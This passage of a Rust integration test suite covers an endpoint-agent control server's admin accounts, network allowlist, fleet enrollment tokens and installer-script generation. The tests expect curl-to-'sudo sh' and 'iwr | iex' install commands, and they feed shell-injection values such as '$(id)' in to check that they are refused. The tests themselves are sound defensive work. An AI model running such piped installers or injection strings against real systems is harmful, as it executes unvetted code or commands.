    let weak = serde_json::json!({ "username": "weak", "password": "short", "role": "user" });
    let (status, _) = call(&app, "POST", "/api/admin/users", Some(&admin), Some(weak)).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    let bad_role = serde_json::json!({ "username": "odd", "password": "Str0ng!Passw0rd", "role": "superuser" });
    let (status, _) = call(&app, "POST", "/api/admin/users", Some(&admin), Some(bad_role)).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    let viewer = serde_json::json!({ "username": "viewer", "password": "Str0ng!Passw0rd", "role": "user" });
    let (status, created) = call(&app, "POST", "/api/admin/users", Some(&admin), Some(viewer.clone())).await;
    assert_eq!(status, StatusCode::CREATED);
    let viewer_id = created["id"].as_str().unwrap().to_string();

    let (status, _) = call(&app, "POST", "/api/admin/users", Some(&admin), Some(viewer)).await;
    assert_eq!(status, StatusCode::CONFLICT);

    let (_, login) = call(&app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "viewer", "password": "Str0ng!Passw0rd" }))).await;
    assert_eq!(login["role"], "user");
    let viewer_token = login["token"].as_str().unwrap().to_string();
    let (status, _) = call(&app, "GET", "/api/admin/users", Some(&viewer_token), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let (status, _) = call(&app, "DELETE", "/api/admin/users/user-1", Some(&admin), None).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "an admin cannot delete their own account");

    let ghost = zedr_control_server::auth::create_jwt("ghost", "ghost", "admin", 0, TEST_JWT_SECRET).unwrap();
    let (status, _) = call(&app, "DELETE", "/api/admin/users/user-1", Some(&ghost), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a signed token for an account that does not exist is refused");

    let (status, _) = call(&app, "DELETE", &format!("/api/admin/users/{}", viewer_id), Some(&admin), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (status, users) = call(&app, "GET", "/api/admin/users", Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);
    let names: Vec<&str> = users.as_array().unwrap().iter().map(|user| user["username"].as_str().unwrap()).collect();
    assert_eq!(names, vec!["tester", "reader"]);
}

#[tokio::test]
async fn test_liveness_and_readiness_probes() {
    let (app, pool) = create_test_app_with_pool().await;

    let (status, _) = call(&app, "GET", "/healthz", None, None).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = call(&app, "GET", "/readyz", None, None).await;
    assert_eq!(status, StatusCode::OK);

    pool.close().await;
    let (status, _) = call(&app, "GET", "/healthz", None, None).await;
    assert_eq!(status, StatusCode::OK, "liveness has no dependencies");
    let (status, _) = call(&app, "GET", "/readyz", None, None).await;
    assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "readiness fails when the database is unreachable");
}

fn app_with_allowlist(pool: SqlitePool, allowlist: &str, peer: Option<&str>) -> axum::Router {
    set_test_env();
    let options = zedr_control_server::api::RouterOptions {
        operator_allowlist: zedr_control_server::api::middleware::parse_operator_allowlist(allowlist).unwrap(),
        frontend_dist: None,
    };
    let app = zedr_control_server::api::create_router_with_options(pool, options);
    match peer {
        Some(peer) => {
            let address: std::net::SocketAddr = format!("{}:50000", peer).parse().unwrap();
            app.layer(axum::extract::connect_info::MockConnectInfo(address))
        }
        None => app,
    }
}

#[tokio::test]
async fn test_operator_surface_is_limited_to_allowed_networks() {
    let pool = create_test_db().await;
    let admin = admin_token("admin");

    let inside = app_with_allowlist(pool.clone(), "203.0.113.0/24", Some("203.0.113.10"));
    let (status, _) = call(&inside, "GET", "/api/admin/agents", Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);

    let outside = app_with_allowlist(pool.clone(), "203.0.113.0/24", Some("198.51.100.20"));
    let (status, _) = call(&outside, "GET", "/api/admin/agents", Some(&admin), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    let (status, _) = call(&outside, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "a", "password": "b" }))).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "login is operator surface too");
    let (status, _) = call(&outside, "GET", "/api-docs/openapi.json", None, None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let unknown_peer = app_with_allowlist(pool, "203.0.113.0/24", None);
    let (status, _) = call(&unknown_peer, "GET", "/api/admin/agents", Some(&admin), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "an unknown peer address is denied");
}

#[tokio::test]
async fn test_agents_reach_the_server_from_outside_the_allowlist() {
    let pool = create_test_db().await;
    let outside = app_with_allowlist(pool.clone(), "203.0.113.0/24", Some("198.51.100.20"));

    let (status, _) = call(&outside, "GET", "/healthz", None, None).await;
    assert_eq!(status, StatusCode::OK);

    let agent = enroll(&outside, &pool, "remote-agent").await;
    let mut agent = agent;
    let body = agent.heartbeat();
    let (status, _) = send_signed(&outside, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn test_console_is_served_with_spa_fallback_and_unknown_api_paths_404() {
    set_test_env();
    let dist = std::env::temp_dir().join(format!("zedr-console-{}", std::process::id()));
    std::fs::create_dir_all(dist.join("assets")).unwrap();
    std::fs::write(dist.join("index.html"), "<html>console</html>").unwrap();
    std::fs::write(dist.join("assets/app.js"), "console.log(1)").unwrap();

    let options = zedr_control_server::api::RouterOptions {
        operator_allowlist: Vec::new(),
        frontend_dist: Some(dist.clone()),
    };
    let app = zedr_control_server::api::create_router_with_options(create_test_db().await, options);

    let fetch = |uri: &'static str| {
        let app = app.clone();
        async move {
            let response = app.oneshot(Request::builder().uri(uri).body(Body::empty()).unwrap()).await.unwrap();
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
            (status, String::from_utf8_lossy(&bytes).to_string())
        }
    };

    assert_eq!(fetch("/").await, (StatusCode::OK, "<html>console</html>".to_string()));
    assert_eq!(fetch("/assets/app.js").await, (StatusCode::OK, "console.log(1)".to_string()));
    assert_eq!(fetch("/admin/agents").await, (StatusCode::OK, "<html>console</html>".to_string()));
    assert_eq!(fetch("/api/does-not-exist").await.0, StatusCode::NOT_FOUND);
    assert_eq!(fetch("/api/admin/agents").await.0, StatusCode::UNAUTHORIZED);

    std::fs::remove_dir_all(&dist).unwrap();
}

struct IssuedFleetToken {
    id: String,
    token: String,
}

async fn create_fleet_token(app: &axum::Router, label: &str, max_uses: Option<i64>) -> IssuedFleetToken {
    let (status, json) = call(
        app,
        "POST",
        "/api/admin/enrollment-tokens",
        Some(&admin_token("admin")),
        Some(serde_json::json!({ "label": label, "expires_in_days": 30, "max_uses": max_uses })),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "fleet token {} must be created", label);

    IssuedFleetToken {
        id: json["id"].as_str().unwrap().to_string(),
        token: json["token"].as_str().unwrap().to_string(),
    }
}

async fn register_with(app: &axum::Router, agent: &mut TestAgent, enrollment_key: Option<&str>) -> StatusCode {
    let body = agent.registration(enrollment_key);
    send_signed(app, agent, "/api/agents/register", body).await.0
}

async fn fleet_token_use_count(pool: &SqlitePool, id: &str) -> i64 {
    sqlx::query_scalar("SELECT use_count FROM enrollment_tokens WHERE id = ?")
        .bind(id)
        .fetch_one(pool)
        .await
        .unwrap()
}

async fn rejections(pool: &SqlitePool) -> Vec<serde_json::Value> {
    sqlx::query_scalar::<_, String>("SELECT data FROM events WHERE event_type = 'enrollment_rejected' ORDER BY rowid")
        .fetch_all(pool)
        .await
        .unwrap()
        .iter()
        .map(|data| serde_json::from_str(data).unwrap())
        .collect()
}

async fn get_with_enrollment_key(app: &axum::Router, uri: &str, key: Option<&str>) -> (StatusCode, Vec<u8>) {
    let mut request = Request::builder().uri(uri);
    if let Some(key) = key {
        request = request.header(zedr_control_server::enrollment::KEY_HEADER, key);
    }
    let response = app.clone().oneshot(request.body(Body::empty()).unwrap()).await.unwrap();
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    (status, bytes.to_vec())
}

#[tokio::test]
async fn test_one_fleet_token_enrolls_many_agents_into_its_group() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "prod-web", None).await;

    for id in ["asg-node-1", "asg-node-2", "asg-node-3"] {
        let mut agent = TestAgent::new(id);
        assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK, "{} must enroll", id);

        let body = agent.heartbeat();
        let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK, "{} must heartbeat with its own key", id);
    }

    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 3);

    let (status, json) = call(&app, "GET", "/api/admin/agents", Some(&admin_token("user")), None).await;
    assert_eq!(status, StatusCode::OK);
    let agents = json["agents"].as_array().unwrap();
    assert_eq!(agents.len(), 3);
    assert!(agents.iter().all(|agent| agent["enrollment_group"] == "prod-web" && agent["enrollment_token_id"] == fleet.id.as_str()));

    let (_, json) = call(&app, "GET", "/api/admin/enrollment-tokens", Some(&admin_token("user")), None).await;
    let listed = &json["tokens"][0];
    assert_eq!(listed["label"], "prod-web");
    assert_eq!(listed["use_count"], 3);
    assert!(listed["last_used_at"].as_i64().unwrap() > 0);
    assert!(listed["revoked_at"].is_null());
}

#[tokio::test]
async fn test_fleet_token_is_shown_once_and_stored_as_a_hash() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "hashed", None).await;

    assert!(fleet.token.starts_with("zedr_fleet_"));
    assert_eq!(fleet.token.len(), "zedr_fleet_".len() + 64);

    let (_, json) = call(&app, "GET", "/api/admin/enrollment-tokens", Some(&admin_token("admin")), None).await;
    assert!(!json.to_string().contains(&fleet.token));

    let rows: Vec<String> = sqlx::query_scalar(
        "SELECT id || token_hash || label || created_by FROM enrollment_tokens"
    ).fetch_all(&pool).await.unwrap();
    assert_eq!(rows.len(), 1);
    assert!(rows.iter().all(|row| !row.contains(&fleet.token)));

    let audit: Vec<String> = sqlx::query_scalar("SELECT detail FROM audit_log").fetch_all(&pool).await.unwrap();
    assert!(audit.iter().all(|detail| !detail.contains(&fleet.token)));
}

#[tokio::test]
async fn test_revoked_fleet_token_stops_new_enrollments_and_keeps_enrolled_agents() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "revocable", None).await;

    let mut enrolled = TestAgent::new("enrolled-before-revocation");
    assert_eq!(register_with(&app, &mut enrolled, Some(&fleet.token)).await, StatusCode::OK);

    let (status, json) = call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", fleet.id), Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(json["revoked_at"].as_i64().unwrap() > 0);
    assert_eq!(json["revoked_by"], "tester");

    let mut late = TestAgent::new("launched-after-revocation");
    assert_eq!(register_with(&app, &mut late, Some(&fleet.token)).await, StatusCode::UNAUTHORIZED);
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 1);

    let rejected = rejections(&pool).await;
    assert_eq!(rejected.len(), 1);
    assert_eq!(rejected[0]["reason"], "revoked");
    assert_eq!(rejected[0]["enrollment_token_id"], fleet.id.as_str());
    assert_eq!(rejected[0]["enrollment_group"], "revocable");
    assert_eq!(rejected[0]["claimed_agent_id"], "launched-after-revocation");

    let body = enrolled.heartbeat();
    let (status, _) = send_signed(&app, &enrolled, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK, "revocation does not touch agents that already enrolled");

    enrolled.restart();
    assert_eq!(register_with(&app, &mut enrolled, Some(&fleet.token)).await, StatusCode::OK, "a pinned key outlives the token");
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 1);
}

#[tokio::test]
async fn test_expired_fleet_token_cannot_enroll() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "short-lived", None).await;
    sqlx::query("UPDATE enrollment_tokens SET expires_at = ? WHERE id = ?")
        .bind(chrono::Utc::now().timestamp() - 1)
        .bind(&fleet.id)
        .execute(&pool)
        .await
        .unwrap();

    let mut agent = TestAgent::new("too-late");
    assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::UNAUTHORIZED);
    assert_eq!(rejections(&pool).await[0]["reason"], "expired");
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 0);
}

#[tokio::test]
async fn test_fleet_token_use_cap_is_enforced() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "capped", Some(2)).await;

    for id in ["capped-1", "capped-2"] {
        let mut agent = TestAgent::new(id);
        assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK);
    }

    let mut third = TestAgent::new("capped-3");
    assert_eq!(register_with(&app, &mut third, Some(&fleet.token)).await, StatusCode::UNAUTHORIZED);

    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 2);
    assert_eq!(rejections(&pool).await[0]["reason"], "exhausted");
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 2);
}

#[tokio::test]
async fn test_concurrent_fleet_enrollments_never_exceed_the_use_cap() {
    set_test_env();
    let database = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join(format!("fleet-race-{}.db", uuid::Uuid::new_v4()));
    let pool = SqlitePoolOptions::new()
        .max_connections(8)
        .connect(&format!("sqlite://{}?mode=rwc", database.display()))
        .await
        .unwrap();
    sqlx::migrate!("./migrations").run(&pool).await.unwrap();
    seed_test_accounts(&pool).await;
    let app = zedr_control_server::api::create_router(pool.clone());
    let fleet = create_fleet_token(&app, "raced", Some(3)).await;

    let attempts = (0..12).map(|index| {
        let app = app.clone();
        let token = fleet.token.clone();
        tokio::spawn(async move {
            let mut agent = TestAgent::new(&format!("raced-{}", index));
            register_with(&app, &mut agent, Some(&token)).await
        })
    });
    let outcomes: Vec<StatusCode> = futures::future::join_all(attempts).await.into_iter().map(|outcome| outcome.unwrap()).collect();

    assert_eq!(outcomes.iter().filter(|status| **status == StatusCode::OK).count(), 3);
    assert_eq!(outcomes.iter().filter(|status| **status == StatusCode::UNAUTHORIZED).count(), 9);
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 3);
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 3);

    pool.close().await;
    for suffix in ["", "-wal", "-shm"] {
        let _ = std::fs::remove_file(format!("{}{}", database.display(), suffix));
    }
}

#[tokio::test]
async fn test_fleet_token_cannot_replace_the_key_of_an_enrolled_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "no-takeover", None).await;

    let mut by_install_key = enroll(&app, &pool, "pet-server").await;
    let mut by_fleet_token = TestAgent::new("cattle-node");
    assert_eq!(register_with(&app, &mut by_fleet_token, Some(&fleet.token)).await, StatusCode::OK);

    for victim in ["pet-server", "cattle-node"] {
        let mut impostor = TestAgent::new(victim);
        assert_eq!(register_with(&app, &mut impostor, Some(&fleet.token)).await, StatusCode::UNAUTHORIZED, "{} must not be taken over", victim);

        assert_eq!(open_incidents(&pool, victim).await, vec!["identity_conflict"]);
        let evidence: String = sqlx::query_scalar("SELECT evidence FROM incidents WHERE agent_id = ? AND incident_type = 'identity_conflict'")
            .bind(victim)
            .fetch_one(&pool)
            .await
            .unwrap();
        let evidence: serde_json::Value = serde_json::from_str(&evidence).unwrap();
        assert_eq!(evidence["enrollment_token_id"], fleet.id.as_str());
        assert_eq!(evidence["enrollment_group"], "no-takeover");

        let body = impostor.heartbeat();
        let (status, _) = send_signed(&app, &impostor, "/api/events", body).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "the impostor key is not pinned to {}", victim);
    }

    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 1, "refused takeovers spend no uses");

    for (agent, id) in [(&mut by_install_key, "pet-server"), (&mut by_fleet_token, "cattle-node")] {
        let pinned: Option<String> = sqlx::query_scalar("SELECT public_key FROM agents WHERE id = ?").bind(id).fetch_one(&pool).await.unwrap();
        assert_eq!(pinned, Some(agent.public_key()));
        let body = agent.heartbeat();
        let (status, _) = send_signed(&app, agent, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK, "{} keeps reporting with its own key", id);
    }
}

#[tokio::test]
async fn test_enrolled_agent_presenting_its_fleet_token_again_spends_no_use() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "rerun", Some(1)).await;

    let mut agent = TestAgent::new("installer-ran-twice");
    assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK);

    agent.restart();
    assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK);
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 1);
    assert!(rejections(&pool).await.is_empty());
}

#[tokio::test]
async fn test_single_use_key_still_replaces_the_identity_of_a_fleet_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "rebuilt", None).await;

    let mut original = TestAgent::new("rebuilt-node");
    assert_eq!(register_with(&app, &mut original, Some(&fleet.token)).await, StatusCode::OK);

    insert_install_key(&pool, "zedr_rebuild_key", 3600).await;
    let mut rebuilt = TestAgent::new("rebuilt-node");
    assert_eq!(register_with(&app, &mut rebuilt, Some("zedr_rebuild_key")).await, StatusCode::OK);

    let (token_id, pinned): (Option<String>, Option<String>) =
        sqlx::query_as("SELECT enrollment_token_id, public_key FROM agents WHERE id = 'rebuilt-node'").fetch_one(&pool).await.unwrap();
    assert_eq!(token_id, None);
    assert_eq!(pinned, Some(rebuilt.public_key()));
}

#[tokio::test]
async fn test_unknown_fleet_token_is_rejected_and_recorded() {
    let (app, pool) = create_test_app_with_pool().await;

    let mut agent = TestAgent::new("guessing");
    let guess = format!("zedr_fleet_{}", "0".repeat(64));
    assert_eq!(register_with(&app, &mut agent, Some(&guess)).await, StatusCode::UNAUTHORIZED);

    let rejected = rejections(&pool).await;
    assert_eq!(rejected[0]["reason"], "unknown");
    assert!(rejected[0]["enrollment_token_id"].is_null());
    assert!(!rejected[0].to_string().contains(&guess));
}

#[tokio::test]
async fn test_enrollment_token_management_needs_an_admin_and_is_audited() {
    let (app, pool) = create_test_app_with_pool().await;
    let admin = admin_token("admin");
    let user = admin_token("user");
    let request = serde_json::json!({ "label": "managed", "expires_in_days": 7 });

    let (status, _) = call(&app, "POST", "/api/admin/enrollment-tokens", None, Some(request.clone())).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = call(&app, "GET", "/api/admin/enrollment-tokens", None, None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = call(&app, "POST", "/api/admin/enrollment-tokens", Some(&user), Some(request.clone())).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    for invalid in [
        serde_json::json!({ "label": "bad label", "expires_in_days": 7 }),
        serde_json::json!({ "label": "", "expires_in_days": 7 }),
        serde_json::json!({ "label": "managed", "expires_in_days": 0 }),
        serde_json::json!({ "label": "managed", "expires_in_days": 366 }),
        serde_json::json!({ "label": "managed", "expires_in_days": 7, "max_uses": 0 }),
    ] {
        let (status, _) = call(&app, "POST", "/api/admin/enrollment-tokens", Some(&admin), Some(invalid.clone())).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{} must be refused", invalid);
    }

    let (status, created) = call(&app, "POST", "/api/admin/enrollment-tokens", Some(&admin), Some(request)).await;
    assert_eq!(status, StatusCode::OK);
    let id = created["id"].as_str().unwrap();
    let token = created["token"].as_str().unwrap();
    let lifetime = created["expires_at"].as_i64().unwrap() - chrono::Utc::now().timestamp();
    assert!((7 * 86400 - 5..=7 * 86400).contains(&lifetime));
    assert_eq!(
        created["linux_command"],
        format!("curl -fsSL -H 'X-Zedr-Enrollment-Key: {}' {}/install.sh | sudo sh", token, TEST_SERVER_URL)
    );
    assert_eq!(created["windows_command"], format!("iwr -useb {}/install.ps1?key={} | iex", TEST_SERVER_URL, token));

    let (status, _) = call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", id), Some(&user), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    let (status, _) = call(&app, "DELETE", "/api/admin/enrollment-tokens/no-such-token", Some(&admin), None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    let (status, first) = call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", id), Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);
    let (status, second) = call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", id), Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(first["revoked_at"], second["revoked_at"], "revoking twice keeps the first revocation");

    let actions: Vec<String> = sqlx::query_scalar("SELECT action FROM audit_log ORDER BY seq").fetch_all(&pool).await.unwrap();
    assert_eq!(actions, vec!["enrollment_token.create", "enrollment_token.revoke"]);
    assert_eq!(zedr_control_server::audit::first_broken_entry(&pool).await.unwrap(), None);
}

#[tokio::test]
async fn test_unix_installer_without_a_key_holds_no_secret_and_is_valid_shell() {
    let app = create_test_app().await;

    let (status, script) = get_with_enrollment_key(&app, "/install.sh", None).await;
    assert_eq!(status, StatusCode::OK);
    let script = String::from_utf8(script).unwrap();

    assert!(script.starts_with("#!/bin/sh\n"));
    assert!(script.contains(&format!("CONTROL_SERVER_URL=\"{}\"", TEST_SERVER_URL)));
    assert!(script.contains("ENROLLMENT_KEY=\"\"\n"));
    assert!(script.contains("ZEDR_ENROLLMENT_KEY"));
    assert!(!script.contains("__ZEDR_"));
    assert!(script.trim_end().ends_with("main \"$@\""), "a truncated download must not run anything");

    let path = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join("install-without-key.sh");
    std::fs::write(&path, &script).unwrap();
    let syntax = std::process::Command::new("sh").arg("-n").arg(&path).output().unwrap();
    assert!(syntax.status.success(), "sh -n: {}", String::from_utf8_lossy(&syntax.stderr));
}

#[tokio::test]
async fn test_unix_installer_embeds_only_a_usable_credential() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "scripted", None).await;
    insert_install_key(&pool, "zedr_scripted_install_key", 3600).await;

    let (status, script) = get_with_enrollment_key(&app, "/install.sh", Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::OK);
    assert!(String::from_utf8(script).unwrap().contains(&format!("ENROLLMENT_KEY=\"{}\"\n", fleet.token)));

    let (status, script) = get_with_enrollment_key(&app, "/install.sh?key=zedr_scripted_install_key", None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(String::from_utf8(script).unwrap().contains("ENROLLMENT_KEY=\"zedr_scripted_install_key\"\n"));

    let (status, script) = get_with_enrollment_key(&app, &format!("/install.ps1?key={}", fleet.token), None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(String::from_utf8(script).unwrap().contains(&format!("$InstallKey = \"{}\"", fleet.token)));

    for refused in ["zedr_fleet_never_issued", "zedr_never_issued", "$(id)", "x\"; id; \""] {
        let (status, body) = get_with_enrollment_key(&app, "/install.sh", Some(refused)).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "{:?} must not yield a script", refused);
        assert!(!String::from_utf8_lossy(&body).contains("#!/bin/sh"));
    }

    call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", fleet.id), Some(&admin_token("admin")), None).await;
    let (status, _) = get_with_enrollment_key(&app, "/install.sh", Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = get_with_enrollment_key(&app, "/install.ps1", Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = get_with_enrollment_key(&app, "/install.ps1", None).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_fleet_token_downloads_the_agent_for_every_machine_until_revoked() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "downloads", Some(1)).await;

    for _ in 0..3 {
        let (status, binary) = get_with_enrollment_key(&app, "/api/installers/binaries/linux-x64", Some(&fleet.token)).await;
        assert_eq!(status, StatusCode::OK);
        let (contents, signature) = binary.split_at(binary.len() - 64);
        let signature = ed25519_dalek::Signature::from_slice(signature).unwrap();
        assert!(test_deployment_key().verify(contents, &signature).is_ok());
    }
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 0, "downloads are not enrollments");

    let recorded: Vec<String> = sqlx::query_scalar("SELECT data FROM events WHERE event_type = 'install' AND agent_id IS NULL")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(recorded.len(), 3);
    assert!(recorded.iter().all(|data| data.contains(&fleet.id) && data.contains("downloads") && !data.contains(&fleet.token)));

    let (status, _) = download_agent(&app, "linux-x64", &fleet.token).await;
    assert_eq!(status, StatusCode::OK, "the query parameter still carries a credential");

    let mut agent = TestAgent::new("last-seat");
    assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK);
    let (status, _) = get_with_enrollment_key(&app, "/api/installers/binaries/linux-x64", Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "an exhausted token serves nothing");

    let unlimited = create_fleet_token(&app, "downloads", None).await;
    call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", unlimited.id), Some(&admin_token("admin")), None).await;
    let (status, _) = get_with_enrollment_key(&app, "/api/installers/binaries/linux-x64", Some(&unlimited.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let rejected = rejections(&pool).await;
    assert_eq!(rejected.len(), 2, "a fleet that can no longer download its agent is visible in the event stream");
    assert_eq!(rejected[0]["stage"], "download");
    assert_eq!(rejected[0]["reason"], "exhausted");
    assert_eq!(rejected[0]["enrollment_token_id"], fleet.id.as_str());
    assert_eq!(rejected[1]["reason"], "revoked");
    assert_eq!(rejected[1]["enrollment_token_id"], unlimited.id.as_str());
    assert_eq!(rejected[1]["platform"], "linux-x64");

    let guess = format!("zedr_fleet_{}", "f".repeat(64));
    let (status, _) = get_with_enrollment_key(&app, "/api/installers/binaries/linux-x64", Some(&guess)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert_eq!(rejections(&pool).await.len(), 2, "guessed tokens leave no events");
}

const ACCOUNT_PASSWORD: &str = "Correct-Horse-9";

async fn sign_in(app: &axum::Router, username: &str, password: &str) -> (StatusCode, serde_json::Value) {
    call(app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": username, "password": password }))).await
}

async fn session_of(app: &axum::Router, username: &str) -> String {
    let (status, login) = sign_in(app, username, ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::OK);
    login["token"].as_str().unwrap().to_string()
}

async fn audit_actions(pool: &SqlitePool) -> Vec<String> {
    sqlx::query_scalar("SELECT action FROM audit_log ORDER BY seq").fetch_all(pool).await.unwrap()
}

#[tokio::test]
async fn test_a_deleted_account_loses_access_at_once() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-gone", "leaver", ACCOUNT_PASSWORD, "admin").await;
    let session = session_of(&app, "leaver").await;
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&session), None).await;
    assert_eq!(status, StatusCode::OK);

    let (status, _) = call(&app, "DELETE", "/api/admin/users/u-gone", Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&session), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = call(&app, "POST", "/api/admin/installers/generate", Some(&session), Some(serde_json::json!({}))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    for stream in ["events", "agents"] {
        let (status, _) = call(&app, "GET", &format!("/api/admin/{}/stream?token={}", stream, session), None, None).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "the {} stream refuses the old session", stream);
    }
}

#[tokio::test]
async fn test_a_disabled_account_cannot_use_its_session_its_api_key_or_its_password() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-off", "suspended", ACCOUNT_PASSWORD, "admin").await;
    let session = session_of(&app, "suspended").await;
    let (status, key) = call(&app, "POST", "/api/admin/api-keys", Some(&session), Some(serde_json::json!({ "name": "ci" }))).await;
    assert!(status.is_success());
    let api_key = key["api_key"].as_str().unwrap().to_string();
    let with_api_key = || Request::builder().uri("/api/admin/agents").header("x-api-key", &api_key).body(Body::empty()).unwrap();
    assert_eq!(app.clone().oneshot(with_api_key()).await.unwrap().status(), StatusCode::OK);

    let admin = admin_token("admin");
    let (status, account) = call(&app, "PATCH", "/api/admin/users/u-off", Some(&admin), Some(serde_json::json!({ "disabled": true }))).await;
    assert_eq!(status, StatusCode::OK);
    assert!(account["disabled_at"].is_i64());

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&session), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert_eq!(app.clone().oneshot(with_api_key()).await.unwrap().status(), StatusCode::UNAUTHORIZED);
    let (status, _) = sign_in(&app, "suspended", ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let (status, account) = call(&app, "PATCH", "/api/admin/users/u-off", Some(&admin), Some(serde_json::json!({ "disabled": false }))).await;
    assert_eq!(status, StatusCode::OK);
    assert!(account["disabled_at"].is_null());
    let (status, _) = sign_in(&app, "suspended", ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::OK);

    let actions = audit_actions(&pool).await;
    assert!(actions.contains(&"user.disable".to_string()) && actions.contains(&"user.enable".to_string()));
}

#[tokio::test]
async fn test_a_role_change_applies_to_sessions_that_are_already_open() {
    let (app, pool) = create_test_app_with_pool().await;
